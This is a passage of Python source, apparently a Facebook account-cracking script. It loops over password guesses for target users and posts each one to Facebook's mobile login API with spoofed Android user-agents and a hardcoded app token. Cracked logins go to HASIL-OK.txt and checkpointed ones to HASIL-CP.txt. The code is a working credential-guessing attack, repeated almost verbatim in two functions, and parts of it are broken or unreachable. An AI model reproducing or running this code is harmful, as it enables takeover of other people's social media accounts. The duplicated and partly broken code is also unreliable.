			mix_model = requests.get('https://gist.githubusercontent.com/Nox-Naved/f0fe39c5e9ff2b70bcb39e48a3e77301/raw/413a4f26f81da4f40d51349a87facc2894bc0531/600+').text.splitlines()
			fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
			fb_vercode = str(random.randint(10000000, 66666666))
			ua1 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
			ua2 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X008D;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
			ua3 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=1.5,width=480,height=854};FBLC/pt_PT;FBRV/82651122;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00BD;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
			ua4 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1352};FBLC/it_IT;FBRV/203912779;FBCR/ho.;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
			ua5= f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.778567894596777,width=1136,height=1485};FBLC/en_US;FBRV/0;FBCR/Comium;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/A21;FBSV/9;FBOP/1;FBCA/arm64-v8a:armeabi;]'
			sex = random.choice([ua1,ua2,ua3,ua4,ua5])
			ugen = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(mix_model)} Build/TP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + sex
			return ugen
			android_version=str(random.randrange(6,13))
			ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=480,height=800}'+f';FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
			adid = str(uuid.uuid4())
			data = {
				"adid": adid,
				"email": user,
				"password": pw,
				"cpl": "true",
				"credentials_type": "device_based_login_password",
				"source": "device_based_login",
				"error_detail_type": "button_with_disabled",
				"source": "login", "format": "json",
				"generate_session_cookies": "1",
				"generate_analytics_claim": "1",
				"generate_machine_id": "1",
				"locale": "pl_PL", "client_country_code": "PL",
				"device": gtt,
				"device_id": adid,
				"method": "auth.login",
				"fb_api_req_friendly_name": "authenticate",
				"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
			}

			head = {
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-sim-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-type": "unknown",
				"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				"user-agent": ugen,
				"x-fb-net-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-bandwidth": str(random.randint(2e7,3e7)),
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-friendly-name": "authenticate",
				"accept-encoding": "gzip, deflate",
				"x-fb-http-engine": "Liger"
			}
			xnxx = ses.post("https://b-api.facebook.com/method/auth.login", data=data, headers=head, allow_redirects=False).text
			result = json.loads(xnxx)
			if "session_key" in result:
				print('\033[1;32m [KIDDIE-OK] '+user+'|'+pw+'\033[0;97m')
				open('HASIL-OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [KIDDIE-CP] '+user+'|'+pw+'\033[0;97m')
				open('HASIL-CP.txt', 'a').write(user+'|'+pw+'\n')
				cps.append(user)
				break
			else:
				continue
		loop+=1
		

	except Exception as e:
		pass



##### CRACKING METHOD B-API ######
########BYE SCRIPT KIDDIE#########
###############################	
def cracker2(user,pwx,tl):
	global loop
	global oks
	global cps
	try:
		for pw in pwx:
			animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
			print(f"\r {animation} {N}{loop}{N}/{M}{len(user)} {N}[{H}OK:{len(oks)}{N}][{K}CP:{len(cps)}{N}] [{H}{'{:.1%}'.format(loop/float(len(user)))}{N}]"%(loop,len(user),oks,cps),end=" ");sys.stdout.flush()
			for i in range(50):
				time.sleep(0.1)
				sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
				sys.stdout.flush()
			#print(f"\r {N}{loop}{N}/{M}{len(user)} {N}[{H}OK:{len(oks)}{N}][{K}CP:{len(cps)}{N}] [{H}{'{:.1%}'.format(loop/float(len(user)))}{N}]"%(loop,len(user),oks,cps),end=" ");sys.stdout.flush()
			#sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(user)} {N}[{H}OK:{len(oks)}{N}][{K}CP:{len(cps)}{N}] [{H}{'{:.1%}'.format(loop/float(len(user)))}{N}] " + animation[i % len(animation)]+"\x1b[0m ")
			#sys.stdout.flush()
			ses=requests.Session()
			mix_model = requests.get('https://gist.githubusercontent.com/Nox-Naved/f0fe39c5e9ff2b70bcb39e48a3e77301/raw/413a4f26f81da4f40d51349a87facc2894bc0531/600+').text.splitlines()
			fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
			fb_vercode = str(random.randint(10000000, 66666666))
			ua1 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
			ua2 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X008D;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
			ua3 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=1.5,width=480,height=854};FBLC/pt_PT;FBRV/82651122;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00BD;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
			ua4 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1352};FBLC/it_IT;FBRV/203912779;FBCR/ho.;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
			ua5= f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.778567894596777,width=1136,height=1485};FBLC/en_US;FBRV/0;FBCR/Comium;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/A21;FBSV/9;FBOP/1;FBCA/arm64-v8a:armeabi;]'
			sex = random.choice([ua1,ua2,ua3,ua4,ua5])
			ugen = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(mix_model)} Build/TP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + sex
			return ugen
			android_version=str(random.randrange(6,13))
			ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=480,height=800}'+f';FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
			adid = str(uuid.uuid4())
			data = {
				"adid": adid,
				"email": user,
				"password": pw,
				"cpl": "true",
				"credentials_type": "device_based_login_password",
				"source": "device_based_login",
				"error_detail_type": "button_with_disabled",
				"source": "login", "format": "json",
				"generate_session_cookies": "1",
				"generate_analytics_claim": "1",
				"generate_machine_id": "1",
				"locale": "pl_PL", "client_country_code": "PL",
				"device": gtt,
				"device_id": adid,
				"method": "auth.login",
				"fb_api_req_friendly_name": "authenticate",
				"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
			}

			head = {
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-sim-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-type": "unknown",
				"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				"user-agent": ugen,
				"x-fb-net-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-bandwidth": str(random.randint(2e7,3e7)),
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-friendly-name": "authenticate",
				"accept-encoding": "gzip, deflate",
				"x-fb-http-engine": "Liger"
			}
			xnxx = ses.post("https://b-api.facebook.com/method/auth.login", data=data, headers=head, allow_redirects=False).text
			result = json.loads(xnxx)
			if "session_key" in result:
				print('\033[1;32m [KIDDIE-OK] '+user+'|'+pw+'\033[0;97m')
				open('HASIL-OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [KIDDIE-CP] '+user+'|'+pw+'\033[0;97m')
				open('HASIL-CP.txt', 'a').write(user+'|'+pw+'\n')
				cps.append(user)
				break
			else:
				continue
		loop+=1
		

	except Exception as e:
		pass


if __name__=='__main__':
	scriptkiddie()

